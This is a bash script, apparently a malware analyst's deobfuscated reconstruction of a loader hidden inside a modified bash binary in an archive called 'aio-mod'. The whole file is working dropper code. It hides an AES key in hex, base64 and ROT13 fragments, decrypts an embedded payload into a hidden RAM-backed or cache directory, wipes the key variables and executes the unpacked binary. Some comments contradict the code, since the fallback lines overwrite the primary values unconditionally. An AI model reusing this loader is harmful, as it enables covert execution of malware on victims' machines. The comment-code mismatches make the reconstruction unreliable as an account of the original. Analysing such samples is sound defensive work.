#!/bin/bash
# =============================================================================
# DEOBFUSCATED BOOTSTRAP SCRIPT
# =============================================================================
# This script was embedded (XOR-encoded) inside a modified bash binary
# within the 'aio-mod' self-extracting archive from:
#   https://github.com/willstore69/toolkit
#
# Original XOR encoding used xbash_salt (16-byte key) and xbash_word (1326 bytes)
# with different salt bytes for different segments of the script.
#
# The script below is the reconstructed, human-readable version.
# =============================================================================

# --- Step 1: Generate a random 8-character alphanumeric string ---
RND=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 8 | head -n 1)

# --- Step 2: Set destination directory ---
# Primary: use /dev/shm (RAM-backed tmpfs, avoids disk writes)
# Fallback: use ~/.cache (when /dev/shm is unavailable)
dest="/dev/shm/.${RND}"
dest="$HOME/.cache/.${RND}"

# --- Step 3: Reconstruct AES decryption key from obfuscated fragments ---
# Each fragment uses a different encoding method to hide the key parts

# Fragment A: hex escape sequences -> "iDBx9XB7"
_a=$(printf '\x69\x44\x42\x78\x39\x58\x42\x37')

# Fragment B: base64 encoded -> "iHLfh0jV"
_b=$(printf '%s' 'aUhMZmgwalY=' | base64 -d 2> /dev/null)

# Fragment C: ROT13 encoded -> "2AM7XR1B"  (digits unchanged, letters rotated)
_c=$(printf '%s' '2NZ7KE1O' | tr 'A-Za-z' 'N-ZA-Mn-za-m')

# Fragment D: hex escape sequences -> "0OT1JIBL"
_d=$(printf '\x30\x4f\x54\x31\x4a\x49\x42\x4c')

# Combine all fragments into the final AES key
# Result: "iDBx9XB7iHLfh0jV2AM7XR1B0OT1JIBL"
_k="${_a}${_b}${_c}${_d}"

# --- Step 4: Determine source file for extracting embedded data ---
# $_OUTER is set by the outer wrapper to point to the original 'aio-mod' file
_src="${_OUTER:-$0}"

# --- Step 5: Extract, decrypt, and unpack the payload ---

# Create the destination directory
mkdir -p "$dest"

# Extract base64 data after the __DATA_BELOW__ marker, decode it
sed "1,/^__DATA_BELOW__/d" "$_src" | base64 -d > "$dest/data.enc"

# Decrypt using AES-256-CBC with PBKDF2 key derivation
# (the Python decryption script below is also embedded in xbash_word)
python3 -c "
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib
key = sys.argv[1].encode()
data = open(sys.argv[2],'rb').read()
dk   = hashlib.pbkdf2_hmac('sha256', key, b'aiomodsalt', 100000, 32)
iv   = data[:16]
enc  = data[16:]
dec  = unpad(AES.new(dk, AES.MODE_CBC, iv).decrypt(enc), AES.block_size)
open(sys.argv[3],'wb').write(dec)
" "$_k" "$dest/data.enc" "$dest/data.zip"

# Extract the decrypted ZIP archive
unzip -o "$dest/data.zip" -d "$dest"

# --- Step 6: Clear sensitive variables ---
_a=""
_b=""
_c=""
_d=""
_k=""

# --- Step 7: Locate and execute the payload binary ---

# Find the main executable (.bin file)
BIN_EXE=$(find "$dest" -type f -name "*.bin" | head -n 1)

# Fallback: find any executable that isn't a library, text, or data file
BIN_EXE=$(find "$dest" -type f -not -name "*.so" -not -name "*.txt" -not -name "*.data" | head -n 1)

# Set up library search path for the bundled shared libraries
BIN_DIR=$(dirname "$BIN_EXE")
LD_LIBRARY_PATH="$BIN_DIR:$dest:$LD_LIBRARY_PATH"

# Execute the payload binary
"$BIN_EXE"
